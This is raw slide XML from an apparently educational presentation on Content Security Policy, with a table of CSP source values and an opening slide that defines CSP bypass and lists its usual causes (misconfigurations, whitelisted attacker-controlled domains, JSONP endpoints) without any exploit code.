            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85" name="Text 83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10121265" y="4723209"/>
            <a:ext cx="1000839"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Violation reporting (new)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="Text 84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="5193268"/>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CSP Source Values</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="Shape 85"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="5561767"/>
            <a:ext cx="7825502" cy="2645569"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 643"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="000000">
                <a:alpha val="8000"/>
              </a:srgbClr>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="Shape 86"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="5569387"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="Text 87"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="5610939"/>
            <a:ext cx="1331476"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Value</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="Text 88"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5089327" y="5610939"/>
            <a:ext cx="2889766"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Meaning</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="Text 89"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="5610939"/>
            <a:ext cx="2893576"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Example</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="Shape 90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="5788581"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="93" name="Text 91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="5830133"/>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'none'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="Text 92"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5089327" y="5830133"/>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Block all</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="Text 93"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="5830133"/>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'none'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="Shape 94"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="6007775"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="Text 95"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="6049328"/>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'self'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="Text 96"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5089327" y="6049328"/>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Same origin only</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Text 97"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="6049328"/>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'self'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="100" name="Shape 98"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="6226969"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="Text 99"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="6268522"/>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'unsafe-inline'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="Text 100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5089327" y="6268522"/>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Allow inline scripts/styles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="Text 101"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="6268522"/>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'unsafe-inline'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name="Shape 102"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="6446163"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="Text 103"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="6487716"/>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'unsafe-eval'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106" name="Text 104"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5089327" y="6487716"/>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Allow eval()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="107" name="Text 105"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="6487716"/>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'unsafe-eval'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108" name="Shape 106"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="6665357"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="109" name="Text 107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="6706910"/>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'strict-dynamic'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="Text 108"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5089327" y="6706910"/>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Trust scripts dynamically</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="111" name="Text 109"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="6706910"/>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'strict-dynamic'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112" name="Shape 110"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="6884551"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="113" name="Text 111"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="6926104"/>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'nonce-&lt;value&gt;'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="Text 112"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5089327" y="6926104"/>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Nonce-based whitelisting</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="115" name="Text 113"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="6926104"/>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'nonce-r4nd0m'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="116" name="Shape 114"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="7103745"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="117" name="Text 115"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="7145298"/>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'sha256-&lt;hash&gt;'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="118" name="Text 116"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5089327" y="7145298"/>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Hash-based whitelisting</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="119" name="Text 117"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="7145298"/>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'sha256-abc123...'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="120" name="Shape 118"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="7322939"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="121" name="Text 119"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="7364492"/>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https:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="122" name="Text 120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5089327" y="7364492"/>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HTTPS only</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="123" name="Text 121"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="7364492"/>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https:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="124" name="Shape 122"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="7542133"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="125" name="Text 123"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="7583686"/>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data:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="126" name="Text 124"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5089327" y="7583686"/>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Data URIs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="127" name="Text 125"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="7583686"/>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img-src data:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="128" name="Shape 126"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="7761327"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="129" name="Text 127"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="7802880"/>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domain.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="130" name="Text 128"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5089327" y="7802880"/>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Specific domain</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="131" name="Text 129"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="7802880"/>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cdn.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="132" name="Shape 130"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="7980521"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="133" name="Text 131"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="8022074"/>
            <a:ext cx="13314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*.domain.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="134" name="Text 132"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5089327" y="8022074"/>
            <a:ext cx="288976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Subdomain wildcard</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="135" name="Text 133"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="8022074"/>
            <a:ext cx="2893576"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script-src *.cdn.com</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46720" y="0"/>
            <a:ext cx="6583680" cy="8253055"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="311825"/>
            <a:ext cx="3221950" cy="354330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="325F7B"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4. What is CSP Bypass?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="688777"/>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Definition</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="1057275"/>
            <a:ext cx="7253049"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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="850" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CSP bypass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> occurs when an attacker finds a way to execute malicious code despite the presence of a Content Security Policy. This typically exploits:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="1257062"/>
            <a:ext cx="3598188" cy="604361"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2815"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="525423" y="138564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Misconfigurations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="525423" y="1596747"/>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in the CSP policy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4051697" y="1257062"/>
            <a:ext cx="3598188" cy="604361"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2815"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4180284" y="1385649"/>
            <a:ext cx="1431250"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Whitelisted domains</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4180284" y="1596747"/>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that host attacker-controlled content</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="1918097"/>
            <a:ext cx="3598188" cy="604361"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2815"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="525423" y="2046684"/>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JSONP endpoints</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="525423" y="2257782"/>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on trusted domains</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
